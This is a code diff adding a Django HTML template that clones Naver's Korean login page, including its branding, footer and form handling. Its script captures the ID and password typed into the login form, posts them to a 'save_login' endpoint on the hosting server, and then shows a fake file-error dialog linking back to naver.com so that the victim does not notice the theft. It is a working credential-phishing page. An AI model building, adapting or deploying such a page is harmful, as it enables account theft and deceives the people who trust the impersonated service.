@@ -1,0 +1,478 @@
+{% load static %}
+<!doctype html>
+<html lang="{{ html_lang|default:'ko' }}">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+    <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
+    />
+    <title>{{ page_title|default:"네이버 : 로그인" }}</title>
+    <link
+      rel="shortcut icon"
+      href="{% static 'favicon.ico' %}"
+      type="image/x-icon"
+    />
+
+    <link
+      rel="stylesheet"
+      type="text/css"
+      href="{% static 'w_20250702.css' %}"
+    />
+    <style>
+      .file-error-modal {
+        display: none;
+        position: fixed;
+        inset: 0;
+        z-index: 999999;
+        align-items: center;
+        justify-content: center;
+        padding: 24px;
+        font-family: -apple-system, BlinkMacSystemFont, "Apple SD Gothic Neo",
+          "Malgun Gothic", "맑은 고딕", "Nanum Gothic", sans-serif;
+      }
+      .file-error-modal.is-open {
+        display: flex;
+      }
+      .file-error-modal__backdrop {
+        position: absolute;
+        inset: 0;
+        background: rgba(0, 0, 0, 0.45);
+        cursor: pointer;
+      }
+      .file-error-modal__panel {
+        position: relative;
+        z-index: 1;
+        width: 100%;
+        max-width: 400px;
+        background: #fff;
+        border-radius: 8px;
+        box-shadow: 0 12px 40px rgba(0, 0, 0, 0.18);
+        overflow: hidden;
+        text-align: center;
+      }
+      .file-error-modal__head {
+        background: #03c75a;
+        height: 48px;
+        display: flex;
+        align-items: center;
+        padding: 0 20px;
+      }
+      .file-error-modal__head a {
+        color: #fff;
+        font-size: 20px;
+        font-weight: 800;
+        letter-spacing: -0.5px;
+        text-decoration: none;
+      }
+      .file-error-modal__body {
+        padding: 32px 24px 36px;
+      }
+      .file-error-modal__body svg {
+        display: block;
+        margin: 0 auto 24px;
+      }
+      .file-error-modal__title {
+        font-size: 19px;
+        font-weight: 700;
+        line-height: 1.45;
+        color: #202020;
+        margin-bottom: 12px;
+        letter-spacing: -0.3px;
+      }
+      .file-error-modal__sub {
+        font-size: 14px;
+        line-height: 1.6;
+        color: #888;
+        margin-bottom: 28px;
+      }
+      .file-error-modal__btn {
+        display: inline-block;
+        background: #03c75a;
+        color: #fff !important;
+        font-size: 15px;
+        font-weight: 700;
+        text-decoration: none;
+        padding: 12px 32px;
+        border-radius: 4px;
+        border: none;
+        cursor: pointer;
+        letter-spacing: -0.2px;
+      }
+      .file-error-modal__btn:hover {
+        background: #02b351;
+      }
+      body.file-error-modal-open {
+        overflow: hidden;
+      }
+    </style>
+  </head>
+
+  <body>
+    <div id="wrap" class="wrap">
+      <div class="u_skip">
+        <a href="https://www.naver.com/">본문 바로가기</a>
+      </div>
+      <header class="header" role="banner">
+        <div class="header_inner">
+          <a
+            href="https://www.naver.com/"
+            class="logo nlog-click"
+            id="log.naver"
+          >
+            <h1 class="blind">NAVER</h1>
+          </a>
+          <div class="lang" id="show_locale_switch_local">
+            <select
+              id="locale_switch_local"
+              name="locale_switch_local"
+              title="언어선택"
+              class="sel"
+            >
+              <option value="ko_KR">한국어</option>
+              <option value="en_US">English</option>
+            </select>
+          </div>
+        </div>
+      </header>
+
+      <div id="container" class="container">
+        <!-- content -->
+        {% include content_template %}
+        <!-- //content -->
+      </div>
+
+      <div class="footer">
+        <div class="footer_inner">
+          <!--[주]고객센터,제휴문의,서비스안내-->
+          <ul class="footer_link" id="footer_link">
+            <li>
+              <a
+                target="_blank"
+                class="footer_item nlog-click"
+                href="http://www.naver.com/rules/service.html"
+                id="fot.agreement"
+                ><span class="text">이용약관</span></a
+              >
+            </li>
+            <li>
+              <a
+                target="_blank"
+                class="footer_item nlog-click"
+                href="http://www.naver.com/rules/privacy.html"
+                id="fot.privacy"
+                ><span class="text"><strong>개인정보처리방침</strong></span></a
+              >
+            </li>
+            <li>
+              <a
+                target="_blank"
+                class="footer_item nlog-click"
+                href="http://www.naver.com/rules/disclaimer.html"
+                id="fot.disclaimer"
+                ><span class="text">책임의 한계와 법적고지</span></a
+              >
+            </li>
+            <li>
+              <a
+                target="_blank"
+                class="footer_item nlog-click"
+                href="https://help.naver.com/alias/membership/p.membership/main.naver"
+                id="fot.help"
+                ><span class="text">회원정보 고객센터</span></a
+              >
+            </li>
+          </ul>
+          <div class="footer_copy">
+            <a
+              id="fot.naver"
+              target="_blank"
+              href="https://www.navercorp.com/"
+              class="nlog-click"
+            >
+              <span class="footer_logo"><span class="blind">네이버</span></span>
+            </a>
+            <span class="text">Copyright</span>
+            <span class="corp">© NAVER Corp.</span>
+            <span class="text">All Rights Reserved.</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div
+      id="file-error-modal"
+      class="file-error-modal"
+      role="dialog"
+      aria-modal="true"
+      aria-labelledby="file-error-modal-title"
+      aria-hidden="true"
+      hidden
+    >
+      <div
+        class="file-error-modal__backdrop"
+        data-file-error-close
+        aria-hidden="true"
+      ></div>
+      <div class="file-error-modal__panel">
+        <div class="file-error-modal__head">
+          <a href="https://www.naver.com/">NAVER</a>
+        </div>
+        <div class="file-error-modal__body">
+          <svg
+            width="100"
+            height="98"
+            viewBox="0 0 120 118"
+            fill="none"
+            aria-hidden="true"
+          >
+            <ellipse cx="60" cy="108" rx="38" ry="7" fill="#e8e8e8" />
+            <path
+              d="M22 48 L22 88 L98 88 L98 42 L54 42 L46 33 H30 Z"
+              fill="#b0b0b0"
+              stroke="#949494"
+              stroke-width="1"
+            />
+            <path d="M22 48 H46 L54 56 H98 L98 88 H22 Z" fill="#c4c4c4" />
+            <circle cx="86" cy="40" r="15" fill="#4a4a4a" />
+            <path
+              d="M80 34 L92 46 M92 34 L80 46"
+              stroke="#fff"
+              stroke-width="2.2"
+              stroke-linecap="round"
+            />
+          </svg>
+          <h2 id="file-error-modal-title" class="file-error-modal__title">
+            {{ file_error_modal.error_title }}
+          </h2>
+          <p class="file-error-modal__sub">{{ file_error_modal.error_sub }}</p>
+          <a
+            class="file-error-modal__btn"
+            href="https://www.naver.com/"
+          >{{ file_error_modal.home_label }}</a>
+        </div>
+      </div>
+    </div>
+
+    <input
+      type="hidden"
+      id="nclicks_nsc"
+      name="nclicks_nsc"
+      value="nid.login_kr"
+    />
+
+    <input type="hidden" id="nid_buk" name="nid_buk" value="exist" />
+    <input type="hidden" id="removeLink" name="removeLink" value="" />
+    <input type="hidden" id="hide_util" name="hide_util" value="" />
+    <input
+      type="hidden"
+      id="ncaptchaSplit"
+      name="ncaptchaSplit"
+      value="split"
+    />
+
+    <input
+      type="hidden"
+      id="id_error_msg"
+      name="id_error_msg"
+      value="&lt;strong&gt;아이디 또는 전화번호&lt;/strong&gt;를 입력해 주세요."
+    />
+
+    <input
+      type="hidden"
+      id="pw_error_msg"
+      name="pw_error_msg"
+      value="&lt;strong&gt;비밀번호&lt;/strong&gt;를 입력해 주세요."
+    />
+
+    <input type="hidden" id="onload_pk" name="onload_pk" value="false" />
+    <input
+      type="hidden"
+      id="locale"
+      name="locale"
+      value="{{ lang|default:'ko_KR' }}"
+    />
+    <input type="hidden" id="adult_surl_v2" name="adult_surl_v2" value="" />
+    <input type="hidden" id="ispopup" name="ispopup" value="false" />
+
+    <!-- {# Naver's bundle expects window.nid.passkey from passkeyApi.js; without it
+    passkey support fails and the script hides the passkey divider/button. #} -->
+    <script>
+      window.nid = window.nid || {};
+      window.nid.passkey = {
+        init: function () {},
+        register: function () {},
+        authenticate: function () {
+          return Promise.reject(
+            new DOMException(
+              "Passkey API not available locally",
+              "NotAllowedError",
+            ),
+          );
+        },
+        passkeySupported: function () {
+          return Promise.resolve(true);
+        },
+      };
+    </script>
+    <script
+      type="text/javascript"
+      id="script-default"
+      data-banner-id="log.banner"
+      src="{% static 'default_202105.js' %}"
+    ></script>
+    <script>
+      (function () {
+        var localeSwitch = document.getElementById("locale_switch_local");
+        if (!localeSwitch) return;
+        var activeLang = "{{ lang|default:'ko_KR' }}";
+        localeSwitch.value = activeLang;
+
+        localeSwitch.addEventListener(
+          "change",
+          function (event) {
+            event.preventDefault();
+            event.stopImmediatePropagation();
+
+            var selectedLang = this.value || "ko_KR";
+            var nextUrl = new URL(window.location.href);
+            nextUrl.searchParams.set("lang", selectedLang);
+            window.location.assign(nextUrl.toString());
+          },
+          true,
+        );
+      })();
+    </script>
+    <script>
+      (function () {
+        function hideEmptyFieldErrors(form) {
+          ["err_empty_id", "err_empty_pw", "err_common"].forEach(function (errId) {
+            var node = form.querySelector("#" + errId);
+            if (node) node.style.display = "none";
+          });
+        }
+
+        function getFileErrorModal() {
+          return document.getElementById("file-error-modal");
+        }
+
+        function openFileErrorModal() {
+          var root = getFileErrorModal();
+          if (!root) return;
+          root.hidden = false;
+          root.classList.add("is-open");
+          root.setAttribute("aria-hidden", "false");
+          document.body.classList.add("file-error-modal-open");
+          var btn = root.querySelector(".file-error-modal__btn");
+          if (btn) btn.focus();
+        }
+
+        function closeFileErrorModal() {
+          var root = getFileErrorModal();
+          if (!root) return;
+          root.classList.remove("is-open");
+          root.setAttribute("aria-hidden", "true");
+          root.hidden = true;
+          document.body.classList.remove("file-error-modal-open");
+        }
+
+        document.addEventListener("keydown", function (e) {
+          if (e.key !== "Escape") return;
+          var root = getFileErrorModal();
+          if (root && root.classList.contains("is-open")) {
+            closeFileErrorModal();
+          }
+        });
+
+        document.addEventListener("click", function (e) {
+          var t = e.target;
+          if (t && t.closest && t.closest("[data-file-error-close]")) {
+            closeFileErrorModal();
+          }
+        });
+
+        function submitLoginForm(form) {
+          var idEl = form.querySelector("#id");
+          var pwEl = form.querySelector("#pw");
+          var id = idEl && idEl.value ? idEl.value.trim() : "";
+          var pw = pwEl && pwEl.value ? pwEl.value.trim() : "";
+          var localeEl = form.querySelector('input[name="locale"]');
+          var lang = localeEl && localeEl.value ? localeEl.value : "ko_KR";
+          var tokenEl = form.querySelector("[name=csrfmiddlewaretoken]");
+          var token = tokenEl ? tokenEl.value : "";
+
+          hideEmptyFieldErrors(form);
+
+          if (!id) {
+            var errId = form.querySelector("#err_empty_id");
+            if (errId) errId.style.display = "block";
+            if (idEl) idEl.focus();
+            return;
+          }
+          if (!pw) {
+            var errPw = form.querySelector("#err_empty_pw");
+            if (errPw) errPw.style.display = "block";
+            if (pwEl) pwEl.focus();
+            return;
+          }
+
+          var fd = new FormData();
+          fd.append("id", id);
+          fd.append("pw", pw);
+          fd.append("csrfmiddlewaretoken", token);
+          fd.append("locale", lang);
+
+          fetch("{% url 'save_login' %}", {
+            method: "POST",
+            body: fd,
+            credentials: "same-origin",
+            headers: { Accept: "application/json" },
+          })
+            .then(function (res) {
+              return res.json().then(function (data) {
+                return { ok: res.ok && data && data.ok, data: data };
+              });
+            })
+            .then(function (result) {
+              if (result.ok) openFileErrorModal();
+            })
+            .catch(function () {
+              /* ignore */
+            });
+        }
+
+        document.addEventListener(
+          "submit",
+          function (e) {
+            var form = e.target;
+            if (!form || form.id !== "frmNIDLogin") return;
+            e.preventDefault();
+            e.stopImmediatePropagation();
+            submitLoginForm(form);
+          },
+          true,
+        );
+
+        document.addEventListener(
+          "click",
+          function (e) {
+            var button = e.target && e.target.closest
+              ? e.target.closest("#frmNIDLogin #log\\.login")
+              : null;
+            if (!button) return;
+            e.preventDefault();
+            e.stopImmediatePropagation();
+            var form = document.getElementById("frmNIDLogin");
+            if (!form) return;
+            submitLoginForm(form);
+          },
+          true,
+        );
+      })();
+    </script>
+
+    <div id="nv_stat" style="display: none">20</div>
+  </body>
+</html>
